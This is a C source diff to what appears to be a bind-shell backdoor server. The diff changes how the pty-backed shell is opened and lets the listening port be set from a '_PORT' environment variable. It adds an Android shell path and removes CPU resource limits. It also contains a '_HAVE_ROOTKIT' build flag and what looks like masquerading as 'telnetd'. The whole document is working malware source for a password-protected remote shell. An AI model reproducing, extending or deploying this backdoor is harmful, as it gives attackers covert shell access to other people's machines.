@@ -113,6 +113,20 @@ int ptyopen(void (*func)(int fd))
 	}
 	fixtty(master);
 
+	setsid();
+
+	if ((slavename = ptsname(master)) == NULL) {
+		close(master);
+		exit(1);
+	}
+
+	if ((slave = open(slavename, O_RDWR | O_NOCTTY)) < 0) {
+		close(master);
+		exit(1);
+	}
+
+	fixtty(slave);
+
 	if ((pid = fork()) == -1) {
 		close(master);
 		return -1;
@@ -120,23 +134,14 @@ int ptyopen(void (*func)(int fd))
 
 	if (pid == 0) {
 		setsid();
-		if ((slavename = ptsname(master)) == NULL) {
-			close(master);
-			exit(1);
-		}
-		if ((slave = open(slavename, O_RDWR | O_NOCTTY)) < 0) {
-			close(master);
-			exit(1);
-		}
-		fixtty(slave);
-
-		setsid();
 
 #ifdef TIOCSCTTY
 		ioctl(slave, TIOCSCTTY, NULL);
 #endif
 		func(slave);
 	}
+
+	close(slave);
 
 	return pid;
 }
@@ -147,6 +152,7 @@ static char *_shell[] = {
 	"/usr/bin/bash",
 	"/bin/bash",
 	"/bin/sh",
+	"/system/bin/sh",
 	NULL
 };
 
@@ -164,13 +170,32 @@ void get_shell()
 
 void do_shell(int fd);
 
+void close_all_fd(int fd)
+{
+	int i;
+
+	for (i = 0; i <= 16; i++) {
+		if (i != fd)
+			close(i);
+	}
+}	
+
 void doit(int fd, void (*func)(int fd))
 {
 	int i, pid, n, other_pid;
 
+#ifdef _HAVE_ROOTKIT
 	_daemon(0);
+#endif
 
 	if (func == NULL)
+		return;
+
+	close_all_fd(fd);
+
+	get_shell();
+
+	if ((pid = ptyopen(func)) == -1)
 		return;
 
 	for (i = 1; i < 64; i++) {
@@ -178,11 +203,6 @@ void doit(int fd, void (*func)(int fd))
 	}
 
 	set_default_signal();
-
-	get_shell();
-
-	if ((pid = ptyopen(func)) == -1)
-		exit(1);
 
 	sock_fd = fd;
 	sock_in = master;
@@ -261,7 +281,6 @@ void do_shell(int fd)
 
 	set_default_signal();
 
-	my_setrlimit(120, 150);
 	my_signal(SIGXCPU, sig_SIGXCPU);
 
 	if ((p = strrchr(shell, '/')))
@@ -485,7 +504,6 @@ int my_exec(int fd, int cmd)
 {
 	struct sigaction sact;
 
-	my_setrlimit(90, 120);
 	my_signal(SIGXCPU, sig_SIGXCPU);
 
 	_telnetd[0] = 't';
@@ -554,6 +572,16 @@ int wait_accept(int fd)
 	return -1;
 }
 
+int get_port()
+{
+	char *p = getenv("_PORT");
+
+	if (p == NULL || atoi(p) <= 0)
+		return _PORT;
+
+	return atoi(p);
+}
+
 int server()
 {
 	int  cmd = 0, on = 1, fd, connfd;
@@ -563,7 +591,6 @@ int server()
 	char tmp[64];
 
 	_daemon(1);
-
 	my_srand(0);
 
 	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
@@ -574,7 +601,7 @@ int server()
 	memset(&servaddr, 0, sizeof(servaddr));
 	servaddr.sin_family      = AF_INET;
 	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
-	servaddr.sin_port        = htons(_PORT);
+	servaddr.sin_port        = htons(get_port());
 
 	if (bind(fd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
 		return 1;
@@ -695,8 +722,6 @@ int main(int argc, char *argv[])
 	passwd = __p;
 
 	init_key(passwd, strlen(passwd));
-
-	my_setrlimit(RLIM_INFINITY, RLIM_INFINITY);
 
 	server();
 
